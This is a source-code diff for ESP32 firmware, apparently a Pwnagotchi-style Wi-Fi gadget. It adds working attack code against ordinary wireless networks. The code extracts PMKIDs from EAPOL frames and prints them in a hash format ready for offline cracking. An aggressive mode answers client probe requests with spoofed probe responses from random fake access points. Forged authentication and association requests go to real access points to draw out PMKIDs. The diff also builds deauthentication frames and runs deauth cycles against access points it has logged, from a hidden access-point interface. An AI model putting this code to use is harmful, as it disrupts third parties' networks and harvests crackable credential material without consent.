@@ -282,7 +282,7 @@ void pwngridAddPeer(DynamicJsonDocument &json, signed int rssi, int channel) {
       pwngrid_peers[i].last_ping = millis();
       pwngrid_peers[i].gone = false;
       pwngrid_peers[i].rssi = rssi;
-      Serial.println("Peer already added");
+      //Serial.println("Peer already added");
       return;
     }
   }
@@ -371,7 +371,6 @@ void getMAC(char *addr, uint8_t *data, uint16_t offset) {
           data[offset + 4], data[offset + 5]);
 }
 
-// helper: stampa un buffer in hex
 void printHex(const uint8_t *b, size_t len) {
   for (size_t i = 0; i < len; ++i) {
     if (b[i] < 0x10) Serial.print('0');
@@ -381,20 +380,363 @@ void printHex(const uint8_t *b, size_t len) {
   Serial.println();
 }
 
+bool isEapol(const uint8_t *buf, int len) {
+    // Must be data frame
+    uint8_t type = (buf[0] >> 2) & 0x03;
+    if (type != 2) return false; // data
+    if (len < 40) return false;
+
+    // LLC/SNAP header for EAPOL
+    //  AA AA 03 00 00 00 88 8E
+    const uint8_t snap_hdr[] = {0xAA,0xAA,0x03,0x00,0x00,0x00,0x88,0x8E};
+
+    for (int i = 0; i < 8; i++) {
+        if (buf[24 + i] != snap_hdr[i]) return false;
+    }
+
+    return true;
+}
+
+String formatPMKID(const uint8_t pmkid[16],
+                   const uint8_t ap_mac[6],
+                   const uint8_t client_mac[6],
+                   const String &ssid)
+{
+    char buf[256];
+
+    char pmkid_hex[33];
+    for (int i = 0; i < 16; i++)
+        sprintf(&pmkid_hex[i*2], "%02x", pmkid[i]);
+
+    char ap_hex[13];
+    sprintf(ap_hex, "%02x%02x%02x%02x%02x%02x",
+            ap_mac[0],ap_mac[1],ap_mac[2],ap_mac[3],ap_mac[4],ap_mac[5]);
+
+    char cli_hex[13];
+    sprintf(cli_hex, "%02x%02x%02x%02x%02x%02x",
+            client_mac[0],client_mac[1],client_mac[2],client_mac[3],client_mac[4],client_mac[5]);
+
+    snprintf(buf, sizeof(buf), "%s*%s*%s*%s",
+             pmkid_hex, ap_hex, cli_hex, ssid.c_str());
+
+    return String(buf);
+}
+
+bool extractPMKID(const uint8_t *frame, int len,
+                  uint8_t pmkid_out[16],
+                  uint8_t ap_mac_out[6],
+                  uint8_t client_mac_out[6])
+{
+    if (!isEapol(frame, len)) return false;
+
+    // addresses
+    memcpy(ap_mac_out,     frame + 16, 6); // addr3 = AP
+    memcpy(client_mac_out, frame + 10, 6); // addr2 = client
+
+    // Locate EAPOL-Key frame
+    int pos = 24 + 8; // after SNAP header = data payload
+    if (pos + 95 >= len) return false;
+
+    uint8_t key_descriptor = frame[pos + 1];
+    if (key_descriptor != 2) {
+        // Not WPA2 key descriptor
+        return false;
+    }
+
+    // Key Data Length (2 bytes)
+    int key_data_len = (frame[pos + 97] << 8) | frame[pos + 98];
+    int key_data_start = pos + 99;
+
+    if (key_data_start + key_data_len > len) return false;
+
+    // Scan IEs inside Key Data
+    int ie_pos = key_data_start;
+    while (ie_pos + 2 < len && ie_pos < key_data_start + key_data_len) {
+        uint8_t id = frame[ie_pos];
+        uint8_t ie_len = frame[ie_pos + 1];
+
+        if (id == 0x30) { // RSN IE
+            // Look for PMKID Count inside RSN
+            int rsn_end = ie_pos + 2 + ie_len;
+            int p = ie_pos + 2;
+
+            while (p + 18 <= rsn_end) {
+                uint8_t pmkid_count = frame[p];
+                uint8_t pmkid_count2 = frame[p+1];
+
+                if (pmkid_count == 0x00 && pmkid_count2 == 0x01) {
+                    memcpy(pmkid_out, frame + p + 2, 16);
+                    return true;
+                }
+                p++;
+            }
+        }
+
+        ie_pos += 2 + ie_len;
+    }
+
+    return false;
+}
+
+void generateFakeApMac(uint8_t mac_out[6]) {
+    mac_out[0] = 0x02;  // locally administered, unicast
+    mac_out[1] = esp_random() & 0xFF;
+    mac_out[2] = esp_random() & 0xFF;
+    mac_out[3] = esp_random() & 0xFF;
+    mac_out[4] = esp_random() & 0xFF;
+    mac_out[5] = esp_random() & 0xFF;
+}
+
+String macToString(const uint8_t mac[6]) {
+    char buf[18];
+    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
+            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+    return String(buf);
+}
+
+String extractSSIDfromProbe(const uint8_t *frame, int len) {
+    // mgmt header = 24 bytes
+    int pos = 24;
+
+    while (pos + 2 < len) {
+        uint8_t tag = frame[pos];
+        uint8_t tag_len = frame[pos+1];
+
+        if (tag == 0) { // SSID
+            if (tag_len == 0) return "";
+            return String((char*)&frame[pos+2], tag_len);
+        }
+
+        pos += 2 + tag_len;
+    }
+
+    return "";
+}
+
+void generateFakeClientMac(uint8_t mac_out[6]) {
+    mac_out[0] = 0x0A; // locally administered
+    mac_out[1] = esp_random() & 0xFF;
+    mac_out[2] = esp_random() & 0xFF;
+    mac_out[3] = esp_random() & 0xFF;
+    mac_out[4] = esp_random() & 0xFF;
+    mac_out[5] = esp_random() & 0xFF;
+}
+
+String extractClientfromProbe(const uint8_t *frame) {
+    char buf[18];
+    sprintf(buf,
+            "%02X:%02X:%02X:%02X:%02X:%02X",
+            frame[10], frame[11], frame[12],
+            frame[13], frame[14], frame[15]);
+    return String(buf);
+}
+
+String extractSSIDfromAP(const uint8_t *frame, int len) {
+    int pos = 36; // beacon header è 36 bytes
+    while (pos + 2 < len) {
+        uint8_t tag = frame[pos];
+        uint8_t tag_len = frame[pos+1];
+        if (tag == 0) { // SSID
+            return String((char*)&frame[pos+2], tag_len);
+        }
+        pos += 2 + tag_len;
+    }
+    return "";
+}
+
+void getApMac(const uint8_t *frame, uint8_t mac_out[6]) {
+    memcpy(mac_out, frame + 16, 6); // addr3
+}
+
+bool isBeacon(const uint8_t *frame) {
+    uint8_t fc = frame[0];
+    uint8_t type = (fc >> 2) & 0x03;
+    uint8_t subtype = (fc >> 4) & 0x0F;
+    return (type == 0 && subtype == 8);
+}
+
+bool isProbeResp(const uint8_t *frame) {
+    uint8_t fc = frame[0];
+    uint8_t type = (fc >> 2) & 0x03;
+    uint8_t subtype = (fc >> 4) & 0x0F;
+    return (type == 0 && subtype == 5);
+}
+
+bool isProbeRequest(const uint8_t *f) {
+    uint8_t fc = f[0];
+    uint8_t type = (fc >> 2) & 0x03;     // bits 2-3
+    uint8_t subtype = (fc >> 4) & 0x0F;  // bits 4-7
+    return (type == 0 && subtype == 4);
+}
+
+void sendAuthReq(const uint8_t ap_mac[6], const uint8_t client_mac[6]) {
+    uint8_t frame[30];
+    int pos = 0;
+
+    frame[pos++] = 0xB0; // Auth frame
+    frame[pos++] = 0x00;
+
+    frame[pos++] = 0; frame[pos++] = 0;
+
+    memcpy(frame+pos, ap_mac, 6); pos+=6;     // dest = AP
+    memcpy(frame+pos, client_mac, 6); pos+=6; // src = our fake client
+    memcpy(frame+pos, ap_mac, 6); pos+=6;     // BSSID
+
+    frame[pos++] = 0; frame[pos++] = 0;       // seq/frag
+
+    frame[pos++] = 0x00; frame[pos++] = 0x00; // auth algo = open
+    frame[pos++] = 0x01; frame[pos++] = 0x00; // seq num
+    frame[pos++] = 0x00; frame[pos++] = 0x00; // status
+
+    esp_wifi_80211_tx(WIFI_IF_AP, frame, pos, false);
+}
+
+void sendAssocReq(const uint8_t ap_mac[6], const uint8_t client_mac[6], const char *ssid) {
+    uint8_t frame[256];
+    int pos = 0;
+
+    frame[pos++] = 0x00; // assoc request
+    frame[pos++] = 0x00;
+
+    frame[pos++] = 0; frame[pos++] = 0;
+
+    memcpy(frame+pos, ap_mac, 6); pos+=6;
+    memcpy(frame+pos, client_mac, 6); pos+=6;
+    memcpy(frame+pos, ap_mac, 6); pos+=6;
+
+    frame[pos++] = 0; frame[pos++] = 0; // frag/seq
+
+    frame[pos++] = 0x31; frame[pos++] = 0x04; // capabilities
+
+    frame[pos++] = 0x64; frame[pos++] = 0; // listen interval
+
+    // SSID IE
+    int ssid_len = strlen(ssid);
+    frame[pos++] = 0x00;
+    frame[pos++] = ssid_len;
+    memcpy(frame+pos, ssid, ssid_len);
+    pos += ssid_len;
+
+    // Supported rates
+    uint8_t rates[] = {0x82,0x84,0x8b,0x96};
+    frame[pos++] = 0x01;
+    frame[pos++] = sizeof(rates);
+    memcpy(frame+pos, rates, sizeof(rates));
+    pos += sizeof(rates);
+
+    esp_wifi_80211_tx(WIFI_IF_AP, frame, pos, false);
+}
+
+void sendProbeResp(wifi_interface_t ifx,
+                   const uint8_t client_mac[6],
+                   const uint8_t ap_mac[6],
+                   const char *ssid) 
+{
+    uint8_t frame[256];
+    int pos = 0;
+
+    // --- FRAME CONTROL ---
+    frame[pos++] = 0x50; // Type=0 mgmt, Subtype=5 (probe response)
+    frame[pos++] = 0x00;
+
+    // --- DURATION ---
+    frame[pos++] = 0x00; 
+    frame[pos++] = 0x00;
+
+    // --- ADDRESSES ---
+    // dest → client
+    memcpy(&frame[pos], client_mac, 6); pos += 6;
+    // source → fake AP
+    memcpy(&frame[pos], ap_mac, 6); pos += 6;
+    // BSSID → fake AP
+    memcpy(&frame[pos], ap_mac, 6); pos += 6;
+
+    // --- SEQ/FRAG ---
+    frame[pos++] = 0x00;
+    frame[pos++] = 0x00;
+
+    // --- TIMESTAMP (dummy 8 bytes) ---
+    for (int i = 0; i < 8; i++) frame[pos++] = 0x00;
+
+    // --- BEACON INTERVAL ---
+    frame[pos++] = 0x64; // 100 TU
+    frame[pos++] = 0x00;
+
+    // --- CAPABILITIES ---
+    frame[pos++] = 0x21; // ESS + Short Preamble
+    frame[pos++] = 0x04;
+
+    // --- SSID element ---
+    int ssid_len = strlen(ssid);
+    frame[pos++] = 0x00;      // tag SSID
+    frame[pos++] = ssid_len;  // length
+    memcpy(&frame[pos], ssid, ssid_len);
+    pos += ssid_len;
+
+    // --- Supported Rates ---
+    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96};
+    frame[pos++] = 0x01;
+    frame[pos++] = sizeof(rates);
+    memcpy(&frame[pos], rates, sizeof(rates));
+    pos += sizeof(rates);
+
+    // --- DS Params (channel) ---
+    frame[pos++] = 0x03; // DS tag
+    frame[pos++] = 1;
+    frame[pos++] = 6; // channel 6 default
+
+    // --- RSN IE (WPA2-PSK minimal) ---
+    const uint8_t rsn_ie[] = {
+        0x30, 0x14,
+        0x01, 0x00,
+        0x00, 0x0f, 0xac, 0x02,
+        0x02, 0x00,
+        0x00, 0x0f, 0xac, 0x04,
+        0x00, 0x0f, 0xac, 0x02,
+        0x00, 0x00
+    };
+    memcpy(&frame[pos], rsn_ie, sizeof(rsn_ie));
+    pos += sizeof(rsn_ie);
+
+    // --- SEND ---
+    esp_err_t r = esp_wifi_80211_tx(ifx, frame, pos, false);
+    //Serial.printf("ProbeResp sent, len=%d, err=%d\n", pos, r);
+}
+
 void handlePacket(wifi_promiscuous_pkt_t *snifferPacket) {
   wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)snifferPacket;
   uint8_t *pkt = ppkt->payload;
-  int pkt_len = ppkt->rx_ctrl.sig_len ? ppkt->rx_ctrl.sig_len : 300;  // usa la len reale se disponibile
+  int pkt_len = ppkt->rx_ctrl.sig_len ? ppkt->rx_ctrl.sig_len : 300;  
   int rx_channel = ppkt->rx_ctrl.channel;
+
+  const uint8_t *frame = ppkt->payload;
+  const uint16_t frameCtrl = static_cast<uint16_t>(frame[0]) | (static_cast<uint16_t>(frame[1]) << 8);
+  const uint8_t frameType = (frameCtrl & 0x0C) >> 2;
+  const uint8_t frameSubtype = (frameCtrl & 0xF0) >> 4;
 
   char addr[] = "00:00:00:00:00:00";
   getMAC(addr, snifferPacket->payload, 10);
+
+  uint8_t pmkid[16];
+  uint8_t ap_mac[6];
+  uint8_t client_mac[6];
+
 
   String mac = String(addr);
   if (known_macs.find(mac) == known_macs.end()) {
       known_macs.insert(mac);
       env.new_aps_found++;
       env.ap_count++;
+  }
+
+  if (frameType == 0x00 && frameSubtype == 0x08) {
+        BeaconEntry entry;
+        const uint8_t *sender = frame + 10;
+        memcpy(entry.mac, sender, sizeof(entry.mac));
+        entry.channel = wifi_get_channel();
+        portENTER_CRITICAL(&gRadioMux);
+        gRegisteredBeacons.insert(entry);
+        portEXIT_CRITICAL(&gRadioMux);
   }
 
   bool isEapol = false;
@@ -448,123 +790,59 @@ void handlePacket(wifi_promiscuous_pkt_t *snifferPacket) {
     enqueue_packet_from_sniffer(pkt, pkt_len, bssid, "EAPOL", (uint8_t)rx_channel);
   }
 
-  size_t max_scan = 230;  // limite ragionevole per non scorrere troppo oltre
+  if (extractPMKID(frame, pkt_len, pmkid, ap_mac, client_mac)) {
+      String ssid = extractSSIDfromAP(frame, pkt_len); // o tienilo da beacon
+      String formatted = formatPMKID(pmkid, ap_mac, client_mac, ssid);
+      Serial.print("[PMKID] ");
+      Serial.println(formatted);
+      env.got_pmkid = true;
+      enqueue_packet_from_sniffer(pkt, 16, ap_mac, "PMKID", (uint8_t)rx_channel);
+  }
 
-  for (size_t i = 0; i + 1 < max_scan; ++i) {
-    if (pkt[i] == 0x30) {
-      // assicurarsi di poter leggere la lunghezza dell'IE
-      uint8_t ie_len = pkt[i + 1];
-      size_t ie_start = i + 2;
-      size_t ie_end = ie_start + ie_len;
-      if (ie_end > max_scan) {
-        continue;
+  if (getEnv().action == AGGRESSIVE_MODE) {
+    if (isProbeRequest(frame) && (esp_random() % 100) == 7) {
+      String ssid = extractSSIDfromProbe(frame, ppkt->rx_ctrl.sig_len);
+      if (ssid.length() == 0) {
+          Serial.println("Empty SSID in Probe");
+          return;
       }
 
-      size_t pos = ie_start;
-      if (pos + 2 > ie_end) continue;  // versione
-      pos += 2;                        // version
+      String clientMac = extractClientfromProbe(frame);
+      Serial.printf("[Probe] SSID='%s' from %s\n",
+                    ssid.c_str(),
+                    clientMac.c_str());
 
-      // group cipher 4 bytes
-      if (pos + 4 > ie_end) continue;
-      pos += 4;
+      uint8_t fake_ap[6];
+      generateFakeApMac(fake_ap);
 
-      // pairwise count (2 bytes)
-      if (pos + 2 > ie_end) continue;
-      uint16_t pairwise_count = pkt[pos] | (pkt[pos + 1] << 8);
-      pos += 2;
-      // pairwise list: 4 * count
-      size_t pairwise_bytes = (size_t)pairwise_count * 4;
-      if (pos + pairwise_bytes > ie_end) continue;
-      pos += pairwise_bytes;
+      //Serial.print("[FakeAP] Using dynamic BSSID ");
+      //Serial.println(macToString(fake_ap).c_str());
 
-      // AKM count (2)
-      if (pos + 2 > ie_end) continue;
-      uint16_t akm_count = pkt[pos] | (pkt[pos + 1] << 8);
-      pos += 2;
-      // akm list: 4 * count
-      size_t akm_bytes = (size_t)akm_count * 4;
-      if (pos + akm_bytes > ie_end) continue;
-      pos += akm_bytes;
+      const uint8_t* client_mac_raw = frame + 10; // addr2
+      sendProbeResp(WIFI_IF_AP, client_mac_raw, fake_ap, ssid.c_str());
 
-      // after AKM, there **may** be RSN Capabilities (2 bytes)
-      if (pos + 2 <= ie_end) {
-        // peek but not mandatory to have
-        // we will advance if space left
-        // but we must ensure we don't step over in case PMKID not present
-        // so check remaining length
-        // compute remaining bytes
-      }
+      //Serial.printf("[FakeAP] ProbeResp sent to %s\n", clientMac.c_str());
+    }
 
-      // compute remaining bytes in IE
-      size_t remaining = (ie_end > pos) ? (ie_end - pos) : 0;
-      if (remaining >= 2) {
-        // possible RSN Capabilities present (2 bytes) + maybe PMKIDCount after
-        // We'll try to detect PMKIDCount by checking if after RSN Capabilities there is at least 2 bytes for pmkid_count
-        size_t pos_after_caps = pos;
-        if (pos_after_caps + 2 <= ie_end) {
-          // treat the next two as RSN Capabilities (if present)
-          pos_after_caps += 2;
-        }
-        // check if we have PMKID count field now
-        if (pos_after_caps + 2 <= ie_end) {
-          uint16_t pmkid_count = pkt[pos_after_caps] | (pkt[pos_after_caps + 1] << 8);
-          // sanity check: pmkid_count reasonable (e.g., 1 or small)
-          if (pmkid_count > 0 && pmkid_count <= 8) {
-            // ensure enough bytes for pmkid list (16 * count)
-            size_t needed = (size_t)pmkid_count * 16;
-            if (pos_after_caps + 2 + needed <= ie_end) {
-              Serial.print("Found PMKID count: ");
-              Serial.println(pmkid_count);
-              // read each PMKID (16 bytes each)
-              size_t pmkid_pos = pos_after_caps + 2;
-              for (uint16_t k = 0; k < pmkid_count; ++k) {
-                uint16_t fc = pkt[0] | (pkt[1] << 8);
-                bool toDS = fc & 0x0100;
-                bool fromDS = fc & 0x0200;
-                uint8_t bssid[6];
-                uint8_t fc_type = (fc >> 2) & 0x3;  // 0=mgmt,1=ctrl,2=data
-                uint8_t addr1[6], addr2[6], addr3[6], addr4[6];
-                memcpy(addr1, pkt + 4, 6);
-                memcpy(addr2, pkt + 10, 6);
-                memcpy(addr3, pkt + 16, 6);
-                if (pkt_len >= 30) memcpy(addr4, pkt + 24, 6);
+    if ((isBeacon(frame) || isProbeResp(frame)) && (esp_random() % 100) == 7) {
 
-                if (fc_type == 0) {  // management
-                  memcpy(bssid, addr3, 6);
-                } else if (fc_type == 2) {  // data
-                  if (!toDS && !fromDS) {
-                    memcpy(bssid, addr3, 6);
-                  } else if (!toDS && fromDS) {
-                    memcpy(bssid, addr2, 6);
-                  } else if (toDS && !fromDS) {
-                    memcpy(bssid, addr3, 6);
-                  } else {  // toDS && fromDS
-                    memcpy(bssid, addr4, 6);
-                  }
-                } else {
-                  // control frames: non gestiti
-                  memcpy(bssid, addr3, 6);  // fallback
-                }
+      String ssid = extractSSIDfromAP(frame, pkt_len);
+      if (ssid.length() == 0) return;
 
-                env.got_pmkid = true;
-                Serial.print("PMKID #");
-                Serial.print(k);
-                Serial.print(": ");
-                printHex(&pkt[pmkid_pos + k * 16], 16);
-                enqueue_packet_from_sniffer(pkt, 16, bssid, "PMKID", (uint8_t)rx_channel);
-              }
-              drawMood(pwnagotchi_moods[10], "I love PMKIDs!", false, getPwngridLastFriendName(), getPwngridClosestRssi());
-              pwngrid_pwned_run++;
-              pwngrid_pwned_tot++;
-              saveStats();
-              i = ie_end;  // salta avanti
-              break;
-            }
-          }
-        }
-      }
-    }  // fi if pkt[i] == 0x30
-  }    // for scan
+      uint8_t ap_mac[6];
+      getApMac(frame, ap_mac);
+    
+      uint8_t fake_client[6];
+      generateFakeClientMac(fake_client);
+
+      Serial.printf("[PMKID-HUNT] AP=%s SSID='%s'\n",
+                    macToString(ap_mac).c_str(), ssid.c_str());
+
+      sendAuthReq(ap_mac, fake_client);
+      vTaskDelay(10 / portTICK_PERIOD_MS);
+      sendAssocReq(ap_mac, fake_client, ssid.c_str());
+    }
+  }
 }
 
 void pwnSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
@@ -585,12 +863,7 @@ void pwnSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
     const WifiMgmtHdr *hdr = &ipkt->hdr;
 
     //Check if we do something about EAPOLs or PMKIDs
-    if (config->personality == SNIFFER 
-    #ifdef I_CAN_BE_BAD
-        || config->personality == AGGRESSIVE) {
-    #else
-    )  {      
-    #endif         
+    if ( config->personality == AI )  {      
       handlePacket(snifferPacket);
     }
 
@@ -680,7 +953,7 @@ void pwnSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
               // Continuation of existing JSON
               fullPacket.concat(packet);
               if (packet.length() > 0 && packet[packet.length() - 1] == '}') {
-                  Serial.println("Complete JSON: " + fullPacket);
+                  //Serial.println("Complete JSON: " + fullPacket);
                   
                   const size_t DOC_SIZE = 4096;
                   DynamicJsonDocument sniffed_json(DOC_SIZE);
@@ -740,14 +1013,26 @@ void initPwning() {
   // Disable WiFi logging
   esp_log_level_set("wifi", ESP_LOG_NONE);
 
-  wifi_init_config_t WIFI_INIT_CONFIG = WIFI_INIT_CONFIG_DEFAULT();
-  esp_wifi_init(&WIFI_INIT_CONFIG);
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
   esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_AP);
-  esp_wifi_start();
+  esp_wifi_set_mode(WIFI_MODE_APSTA);
+
   esp_wifi_set_promiscuous_filter(&filter);
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(&pwnSnifferCallback);
+
+  // ---- initialize AP interface (stealth) ----
+  wifi_config_t ap_cfg = {0};
+  ap_cfg.ap.ssid_len = 0;
+  ap_cfg.ap.channel = 6;
+  ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
+  ap_cfg.ap.max_connection = 0;
+
+  esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
+
+  esp_wifi_start();
+
   // esp_wifi_set_ps(WIFI_PS_NONE);
   esp_wifi_set_channel(random(0, 14), WIFI_SECOND_CHAN_NONE);
   delay(1);
@@ -755,22 +1040,70 @@ void initPwning() {
 }
 
 esp_err_t sendRawFrame(wifi_interface_t ifx, const void *frame, int len, const char *tag) {
-    esp_err_t err = esp_wifi_internal_tx(ifx, frame, len);
-    if (err == ESP_ERR_NOT_SUPPORTED || err == ESP_ERR_INVALID_ARG) {
-        Serial.println("Internal TX unsupported; falling back");
-        err = esp_wifi_80211_tx(ifx, frame, len, false);
+    esp_err_t err;
+
+    // First try esp_wifi_internal_tx ONLY if not in promiscuous mode
+    wifi_mode_t mode;
+    esp_wifi_get_mode(&mode);
+
+    if (mode == WIFI_MODE_STA || mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA) {
+        err = esp_wifi_internal_tx(ifx, frame, len);
+        if (err != ESP_OK) {
+            Serial.println("internal_tx failed, falling back to 80211_tx");
+            goto fallback;
+        }
+        return ESP_OK;
+    }
+
+fallback:
+    err = esp_wifi_80211_tx(ifx, frame, len, false);
+    if (err != ESP_OK) {
+        Serial.printf("80211_tx failed: %d\n", err);
     }
     return err;
 }
 
+
+void sendDeauthPacket(const uint8_t* bssid, const uint8_t* sta)
+{
+  struct
+  {
+    uint8_t frame_control[2];
+    uint8_t duration[2];
+    uint8_t addr1[6];
+    uint8_t addr2[6];
+    uint8_t addr3[6];
+    uint8_t sequence_control[2];
+    uint8_t reason_code[2];
+  } __attribute__((packed)) deauth_frame;
+
+  deauth_frame.frame_control[0] = 0xC0;  // To DS + From DS + Deauth Frame
+  deauth_frame.frame_control[1] = 0x00;
+  deauth_frame.duration[0] = 0x00;
+  deauth_frame.duration[1] = 0x00;
+  memcpy(deauth_frame.addr1, sta, 6);    // STA address
+  memcpy(deauth_frame.addr2, bssid, 6);  // AP address
+  memcpy(deauth_frame.addr3, bssid, 6);  // AP address
+  deauth_frame.sequence_control[0] = 0x00;
+  deauth_frame.sequence_control[1] = 0x00;
+  deauth_frame.reason_code[0] = 0x01;  // Reason: Unspecified reason
+  deauth_frame.reason_code[1] = 0x00;
+
+  esp_wifi_80211_tx(WIFI_IF_AP, (uint8_t*)&deauth_frame, sizeof(deauth_frame), true);
+}
+
 void performDeauthCycle() {
+    Serial.println("Performing deauth");
     std::vector<BeaconEntry> snapshot;
     snapshot.reserve(gRegisteredBeacons.size());
     portENTER_CRITICAL(&gRadioMux);
     std::copy(gRegisteredBeacons.begin(), gRegisteredBeacons.end(), std::back_inserter(snapshot));
     portEXIT_CRITICAL(&gRadioMux);
 
-    if (snapshot.empty()) { return; }
+    if (snapshot.empty()) { 
+      Serial.println("Snapshot empty, returning");
+      return; 
+    }
 
     uint8_t originalChannel = readWifiChannel();
 
@@ -782,8 +1115,11 @@ void performDeauthCycle() {
         memcpy(frame + 16, entry.mac, 6);
 
         esp_wifi_set_channel(entry.channel, WIFI_SECOND_CHAN_NONE);
+        Serial.printf("Sending three magic packets to: %02x:%02x:%02x:%02x:%02x:%02x\n", 
+            entry.mac[0], entry.mac[1], entry.mac[2], entry.mac[3], entry.mac[4], entry.mac[5]);
+
         for (int i = 0; i < 3; ++i) {
-            esp_err_t err = sendRawFrame(WIFI_IF_STA, frame, sizeof(frame), "Deauth");
+            esp_err_t err = sendRawFrame(WIFI_IF_AP, frame, sizeof(frame), "Deauth");
             if (err != ESP_OK) {
                 Serial.println("Deauth tx failed on STA iface.");
             }
